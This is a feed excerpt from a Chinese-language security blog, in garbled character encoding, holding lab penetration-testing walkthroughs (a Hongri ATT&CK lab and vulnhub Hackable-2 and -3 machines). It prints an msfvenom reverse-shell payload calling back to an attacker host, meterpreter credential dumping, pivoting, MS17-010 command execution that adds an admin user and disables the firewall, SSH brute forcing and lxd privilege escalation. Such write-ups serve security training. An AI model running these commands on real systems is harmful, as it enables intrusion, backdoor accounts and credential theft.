title="å†…ç½‘ä¿¡æ¯æ”¶é›†"></a>å†…ç½‘ä¿¡æ¯æ”¶é›†</h2><p><code>whoami</code>æŸ¥çœ‹å½“å‰ç”¨æˆ·ä¸ºç®¡ç†å‘˜<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171540344.png"></p><p><code>ipconfig</code> å‘ç°è¿˜å­˜åœ¨ä¸€ä¸ªç½‘æ®µ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171541043.png"></p><p><code>net config Workstation</code> æŸ¥çœ‹å½“å‰è®¡ç®—æœºåç§°,ç”¨æˆ·åç­‰è¯¦ç»†ä¿¡æ¯<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171543492.png"></p><p><code>net localgroup administrators</code> æŸ¥çœ‹å…¶ä»–ç®¡ç†å‘˜<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171543392.png"></p><p><code>systeminfo</code> æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯,å‘ç°æ‰“äº†4ä¸ªè¡¥ä¸,å½“å‰åŸŸä¸ºgod.org,åŸŸæœåŠ¡å™¨åOWA<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171545007.png"></p><h2 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h2><p>ç”±äºwin7å¯åŠ¨äº†å®‰å…¨æ¨¡å¼,æ‰€ä»¥æ— æ³•ç›´æ¥åå¼¹shell,ç”¨msfç”Ÿæˆä¸€ä¸ªæœ¨é©¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.118 LPORT=4444 -f exe -o msf.exe</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.31.118</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171558828.png"></p><p>æå‡ä¸ºsystemæƒé™<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171601565.png"></p><p>psï¼šmimikatzæ¨¡å—å·²ç»åˆå¹¶ä¸ºkiwiæ¨¡å—</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">creds_allï¼šåˆ—ä¸¾æ‰€æœ‰å‡­æ®</span><br><span class="line">creds_kerberosï¼šåˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ®</span><br><span class="line">creds_msvï¼šåˆ—ä¸¾æ‰€æœ‰msvå‡­æ®</span><br><span class="line">creds_sspï¼šåˆ—ä¸¾æ‰€æœ‰sspå‡­æ®</span><br><span class="line">creds_tspkgï¼šåˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ®</span><br><span class="line">creds_wdigestï¼šåˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ®</span><br><span class="line">dcsyncï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯</span><br><span class="line">dcsync_ntlmï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID</span><br><span class="line">golden_ticket_createï¼šåˆ›å»ºé»„é‡‘ç¥¨æ®</span><br><span class="line">kerberos_ticket_listï¼šåˆ—ä¸¾kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_purgeï¼šæ¸…é™¤kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_useï¼šä½¿ç”¨kerberosç¥¨æ®</span><br><span class="line">kiwi_cmdï¼šæ‰§è¡Œmimikatzçš„å‘½ä»¤ï¼Œåé¢æ¥mimikatz.exeçš„å‘½ä»¤</span><br><span class="line">ls<span class="built_in">a_dump</span>_samï¼šdumpå‡ºlsaçš„SAM</span><br><span class="line">ls<span class="built_in">a_dump</span>_secretsï¼šdumpå‡ºlsaçš„å¯†æ–‡</span><br><span class="line">password_changeï¼šä¿®æ”¹å¯†ç </span><br><span class="line">wifi_listï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶</span><br><span class="line">wifi_list_sharedï¼šåˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŠ“å–å¯†ç <br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171613114.png"></p><h1 id="è¿›å…¥å†…ç½‘"><a href="#è¿›å…¥å†…ç½‘" class="headerlink" title="è¿›å…¥å†…ç½‘"></a>è¿›å…¥å†…ç½‘</h1><h2 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_applications</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171616956.png"></p><p>æŸ¥çœ‹è·¯ç”±,å‘ç°è¿˜å­˜åœ¨å¦ä¸€ä¸ªç½‘æ®µ192.168.52.0&#x2F;24</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171618532.png"></p><p>æ·»åŠ è·¯ç”±</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24æ·»åŠ å½•è·¯ç”±ï¼›</span><br><span class="line">run autoroute -pæŸ¥çœ‹è·¯ç”±ï¼›</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171621412.png"></p><p>è®¾ç½®ä»£ç†è®¿é—®å†…ç½‘<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171652380.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line"><span class="built_in">set</span> srvhost 192.168.2.129</span><br><span class="line"><span class="built_in">set</span> srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>é…ç½®ä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171653857.png"></p><p>æµ‹è¯•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171719877.png"></p><p>æ¢æµ‹å†…ç½‘å­˜æ´»ä¸»æœº<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171706996.png"></p><p>ç”¨nmapæ‰«æå´æ‰«ä¸å‡ºæ¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171720554.png"></p><p>åˆšåˆšæ‹¿ä¸‹çš„win7æ˜¯å­˜åœ¨nmapçš„,ç”¨å®ƒæ‰«æ.è¿›å…¥kaliåˆšåˆšåå¼¹çš„ä¼šè¯,èšå‰‘ä¸æ˜¯äº¤äº’å¼shellçœ‹ä¸åˆ°è¿”å›<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171727686.png"></p><h1 id="å†…ç½‘æ‰“ç‚¹"><a href="#å†…ç½‘æ‰“ç‚¹" class="headerlink" title="å†…ç½‘æ‰“ç‚¹"></a>å†…ç½‘æ‰“ç‚¹</h1><p>ä¸¤å°ä¸»æœºéƒ½å­˜åœ¨445 å’Œ 135 ç«¯å£,è¯´æ˜å­˜åœ¨smbæœåŠ¡<br>å°è¯•ms17_010,å‘ç°æ‰“ä¸äº†<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171731292.png"></p><p>å†æ¬¡å°è¯•ms17_010_command,æˆåŠŸæ‰§è¡Œå‘½ä»¤<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207171733335.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net user hack 8888! /addæ·»åŠ ç”¨æˆ·ï¼›</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> net localgroup administrators hack /addæ·»åŠ ç®¡ç†å‘˜æƒé™ï¼›</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> <span class="string">&#x27;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#x27;</span>æ‰§è¡Œå‘½ä»¤å¼€å¯3389ç«¯å£ï¼Œè¿™é‡Œè¦ä¹ˆç”¨å•å¼•å·æŠŠå‘½ä»¤å¼•ä½ï¼Œè¦ä¹ˆç”¨åæ–œæ å¯¹åæ–œæ å’Œå¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œå¦åˆ™ä¼šå‡ºé”™ï¼›</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">command</span> netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span> /å…³é—­é˜²ç«å¢™</span><br></pre></td></tr></table></figure><p>win2003ä¹Ÿæ˜¯ä¸€æ ·çš„æ‰“æ³•ä¸å†èµ˜è¿°</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;æ‹“æ‰‘å›¾&quot;&gt;&lt;a href=&quot;#æ‹“æ‰‘å›¾&quot; class=&quot;headerlink&quot; title=&quot;æ‹“æ‰‘å›¾&quot;&gt;&lt;/a&gt;æ‹“æ‰‘å›¾&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207171447834.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;ä¸‰å°æœºå™¨ï¼Œè§£å‹ä½¿ç”¨vmæ‰“å¼€ï¼Œé»˜è®¤å¯†ç hongrisec@2019&lt;/p&gt;
&lt;h1 id=&quot;ç½‘ç»œé…ç½®&quot;&gt;&lt;a href=&quot;#ç½‘ç»œé…ç½®&quot; class=&quot;headerlink&quot; title=&quot;ç½‘ç»œé…ç½®&quot;&gt;&lt;/a&gt;ç½‘ç»œé…ç½®&lt;/h1&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>hackable-3æ‰“é¶</title>
    <link href="https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/27/hackable-3%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-27T12:01:23.000Z</published>
    <updated>2022-06-28T02:41:45.513Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>vulnhubé¡¹ç›® <a href="https://www.vulnhub.com/entry/hackable-iii,720/">https://www.vulnhub.com/entry/hackable-iii,720/</a><br>é¶æœº:172.16.17.156<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>nmapæ‰«æé¶æœº,22ç«¯å£filtered,80æ­£å¸¸å¼€å‘,apache<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272036738.png"></p><p>è®¿é—®é¦–é¡µçœ‹çœ‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272042009.png"></p><p>æ²¡æœ‰åŠŸèƒ½ç‚¹,æ‰«ä¸‹ç›®å½•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272044678.png"></p><p>æŒ¨ä¸ªè®¿é—®,æœ‰ä¸¤ä¸ªtxtæ–‡ä»¶<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272053867.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272054740.png"><br>ä¸€ä¸ªå­—å…¸<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272055221.png"></p><p>ä¸€ä¸²å¯†æ–‡,base64è§£å‡ºä¸º10000,æš‚æ—¶ä¸çŸ¥é“ä»€ä¹ˆæ„æ€,ç»§ç»­å¾€ä¸‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272057190.png"></p><p>åœ¨ç½‘é¡µæºç é‡Œçœ‹åˆ°äº†æ³¨é‡Š,å¾—åˆ°æç¤º,è¿˜æœ‰ä¸€ä¸ªç™»å½•å£<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272048590.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &quot;Please, jubiscleudo, don&#x27;t forget to activate the port knocking when exiting your section, </span></span><br><span class="line"><span class="comment">and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- â€œjubiscleudoï¼Œè¯·ä¸è¦å¿˜è®°åœ¨é€€å‡ºéƒ¨é—¨æ—¶æ¿€æ´»ç«¯å£æ•²é—¨ï¼Œå¹¶å‘Šè¯‰è€æ¿ä¸è¦å¿˜è®°æ‰¹å‡†.jpgæ–‡ä»¶-dev_suport@hackable3.com&quot; --&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ªç”¨æˆ·åå’Œä¸€ä¸ªé‚®ç®±,ç»“åˆä¸Šé¢çš„ç«¯å£æ‰«æ,åº”è¯¥æ˜¯æç¤ºéœ€è¦ç¢°æ’æ‰“å¼€22ç«¯å£</p><p>è®¿é—®ç™»å½•å£<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272100696.png"></p><p>å°è¯•åˆ©ç”¨ä¸Šé¢çš„å­—å…¸çˆ†ç ´,æ— æœ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272105700.png"></p><p>åœ¨ç™»å½•é¡µçš„æºç é‡Œç¿»åˆ°ä¸€ä¸ªåœ°å€<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272110189.png"></p><p>è¿›ä¸€æ­¥æ‰«æç›®å½•,.phpç»“å°¾çš„æ–‡ä»¶<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272111295.png"></p><p>æŒ¨ä¸ªè®¿é—®,çˆ†å‡ºäº†æºç å’Œæ•°æ®åº“å¯†ç ,ä½†æ˜¯æ•°æ®åº“ç«¯å£å¹¶ä¸å¯¹å¤–å¼€æ”¾<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272112979.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272113138.png"></p><p>login.phpä¸­æåˆ°ä¸€ä¸ª3.jpg,ç›´æ¥è®¿é—®çœ‹çœ‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272125744.png"></p><p>æ²¡æœ‰ä»»ä½•æç¤ºå’Œåˆ©ç”¨çš„åœ°æ–¹,æƒ³åˆ°éšå†™,æŠŠå›¾ç‰‡ä¸‹è½½ä¸‹æ¥ è¿›è¡Œçˆ†ç ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://172.16.17.156/3.jpg ./</span><br><span class="line">steghide --extract -sf 3.jpg</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272134681.png"></p><p>å¾—åˆ°æç¤º,porta:65535,å‰é¢å¾—åˆ°ä¸€ä¸ª10000,åº”è¯¥æ˜¯knockä½¿ç”¨ç¢°æ’sshç«¯å£,ä½†æ˜¯è¿˜å·®ä¸€ä¸ª,ç»§ç»­ç¿»å‰é¢çˆ†ç ´å‡ºçš„ç›®å½•</p><p>ç¿»åˆ°ä¸€ä¸ª2.txt<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272140728.png"></p><p>ç†Ÿæ‚‰çš„ctfåŠ å¯†æ–¹å¼<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272140818.png"></p><p>è§£å¯† <a href="http://www.hiencode.com/brain.html">http://www.hiencode.com/brain.html</a><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206272142726.png"></p><p>å¾—åˆ°ä¸‰ä¸ªç«¯å£å· 65535 10000 4444</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="ç¢°æ’sshæ‰“å¼€ç«¯å£"><a href="#ç¢°æ’sshæ‰“å¼€ç«¯å£" class="headerlink" title="ç¢°æ’sshæ‰“å¼€ç«¯å£"></a>ç¢°æ’sshæ‰“å¼€ç«¯å£</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">knock 172.16.17.156 -v 10000 4444 65535</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206280958059.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206280959656.png"></p><h2 id="çˆ†ç ´ssh"><a href="#çˆ†ç ´ssh" class="headerlink" title="çˆ†ç ´ssh"></a>çˆ†ç ´ssh</h2><p>ä½¿ç”¨ä¸Šé¢æ‹¿åˆ°çš„ç”¨æˆ·åå’Œå­—å…¸,çˆ†ç ´ssh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jubiscleudo -P wordlist.txt 172.16.17.156 ssh </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281006417.png"></p><p>ç™»å½•è´¦å·,æ‰¾åˆ°ç¬¬ä¸€ä¸ªflag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281012148.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æ²¡æœ‰sudoæƒé™çš„æ–‡ä»¶,åœ¨ç½‘ç«™ç›®å½•ä¸‹ç¿»åˆ°ä¸€ä¸ªéšè—æ–‡ä»¶,æç¤ºæˆ‘ä»¬mysql rootç”¨æˆ·æ²¡æœ‰å¯†ç <br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281015482.png"></p><p>å°è¯•ç™»å½•mysqlå‘ç°æ ¹æœ¬æ²¡æœ‰è¿™ä¸ªæœåŠ¡<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281017369.png"></p><p>å›åˆ°ä¸Šé¢çš„éšè—æ–‡ä»¶,å‘ç°ç»™å‡ºä¸€ä¸ªè´¦å·å¯†ç ,åœ¨å®¶ç›®å½•ç¿»çš„æ—¶å€™,æ°å¥½æœ‰ä¸€ä¸ªhackable_3ç”¨æˆ·çš„æ–‡ä»¶å¤¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;DB_USERNAME&#x27;</span>, <span class="string">&#x27;hackable_3&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;TrOLLED_3&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281020151.png"></p><p>ç™»å½•æˆåŠŸ,ä½†æ˜¯æ²¡æœ‰ä»»ä½•å¯åˆ©ç”¨çš„åœ°æ–¹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281023340.png"></p><p>æŸ¥é˜…å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ,å‘ç°åœ¨lxdç»„ä¸­,lxdå’Œdockerä¸€æ ·,ä¸€ç§å®¹å™¨<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281028117.png"></p><p>åˆ©ç”¨lxdå®¹å™¨ææƒ,æ€è·¯æ˜¯å°†å®¹å™¨çš„ç›®å½•æ˜ å°„åˆ°rootç›®å½•ä¸‹<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281039098.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281037956.png"></p><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">ææƒæ–¹æ³•</a> ä½¿ç”¨ç¬¬äºŒç§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># build a simple alpine image</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder</span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder</span><br><span class="line">sed -i <span class="string">&#x27;s,yaml_path=&quot;latest-stable/releases/$apk_arch/latest-releases.yaml&quot;,yaml_path=&quot;v3.8/releases/$apk_arch/latest-releases.yaml&quot;,&#x27;</span> build-alpine</span><br><span class="line">sudo ./build-alpine -a i686</span><br><span class="line"></span><br><span class="line"><span class="comment"># import the image</span></span><br><span class="line">lxc image import ./alpine*.tar.gz --<span class="built_in">alias</span> myimage <span class="comment"># It&#x27;s important doing this from YOUR HOME directory on the victim machine, or it might fail.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># before running the image, start and configure the lxd storage pool as default </span></span><br><span class="line">lxd init</span><br><span class="line"></span><br><span class="line"><span class="comment"># run the image</span></span><br><span class="line">lxc init myimage mycontainer -c security.privileged=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mount the /root into the image</span></span><br><span class="line">lxc config device add mycontainer mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># interact with the container</span></span><br><span class="line">lxc start mycontainer</span><br><span class="line">lxc <span class="built_in">exec</span> mycontainer /bin/sh</span><br></pre></td></tr></table></figure><p>åœ¨&#x2F;mnt&#x2F;root&#x2F;rootä¸‹æ‹¿åˆ°flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206281041068.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒ&quot;&gt;&lt;/a&gt;ç¯å¢ƒ&lt;/h1&gt;&lt;p&gt;vulnhubé¡¹ç›® &lt;a href=&quot;https://www.vulnhub.com/entry/hackable-iii,720/&quot;&gt;https://www.vulnhub.com/entry/hackable-iii,720/&lt;/a&gt;&lt;br&gt;é¶æœº:172.16.17.156&lt;br&gt;æ”»å‡»æœºkali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;p&gt;nmapæ‰«æé¶æœº,22ç«¯å£filtered,80æ­£å¸¸å¼€å‘,apache&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206272036738.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;è®¿é—®é¦–é¡µçœ‹çœ‹&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206272042009.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="æ‰“é¶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="ftp" scheme="https://syst1m.top/tags/ftp/"/>
    
  </entry>
  
  <entry>
    <title>hackable:2æ‰“é¶</title>
    <link href="https://syst1m.top/2022/06/27/hackable-2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/27/hackable-2%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-27T07:44:44.000Z</published>
    <updated>2022-06-27T12:00:56.660Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>vulnhubé¡¹ç›® <a href="https://www.vulnhub.com/entry/darkhole-2,740/">https://www.vulnhub.com/entry/darkhole-2,740/</a><br>é¶æœº:172.16.17.155<br>æ”»å‡»æœºkali:172.16.17.140</p><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>å¯¹é¶æœºè¿›è¡Œç«¯å£æ‰«æ,å¼€æ”¾äº†21,22,80,å­˜åœ¨Anonymousç”¨æˆ·<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271926183.png"></p><p>ç½‘ç«™å°±ä¸€ä¸ªapacheé¦–é¡µ<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271935104.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>å›åˆ°ftpä½¿ç”¨Anonymousç”¨æˆ·ç™»å½•,å¯†ç ä¸ºä»»æ„é‚®ç®±,<a href="mailto:&#x31;&#50;&#x33;&#64;&#49;&#x32;&#51;&#x2e;&#99;&#111;&#x6d;">&#x31;&#50;&#x33;&#64;&#49;&#x32;&#51;&#x2e;&#99;&#111;&#x6d;</a><br>å‘ç°å­˜åœ¨ä¸€ä¸ªhtmlæ–‡ä»¶ä¸‹è½½ä¸‹æ¥<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271932686.png"></p><p>æ‰“å¼€,æŸ¥çœ‹æºä»£ç ,titleæœ‰ä¸€ä¸²å¯ç–‘å­—ç¬¦,å’Œä¸€å¥æç¤º<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271934487.png"></p><p>æ²¡æœ‰åˆ©ç”¨çš„ç‚¹,å›åˆ°ç½‘ç«™,æ‰«ä¸€ä¸‹ç›®å½•,æ‰«åˆ°ä¸€ä¸ªfiles<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271938467.png"></p><p>æ‰“å¼€å‘ç°ä¸€ä¸ªCALL.html,å’Œftpä¸Šçš„ä¸€æ¨¡ä¸€æ ·<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271939684.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271939512.png"></p><p>çŒœæµ‹ftpç›®å½•å’Œwebç›®å½•ä¸ºåŒä¸€ä¸ª,åˆ©ç”¨ftpä¸Šä¼ webshellè¯•è¯•<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271941357.png"></p><p>è®¿é—®å­˜åœ¨,ä¸Šèšå‰‘<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206271944032.png"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ç”¨èšå‰‘åå¼¹ä¸€ä¸ªshellåˆ°kali<br><img 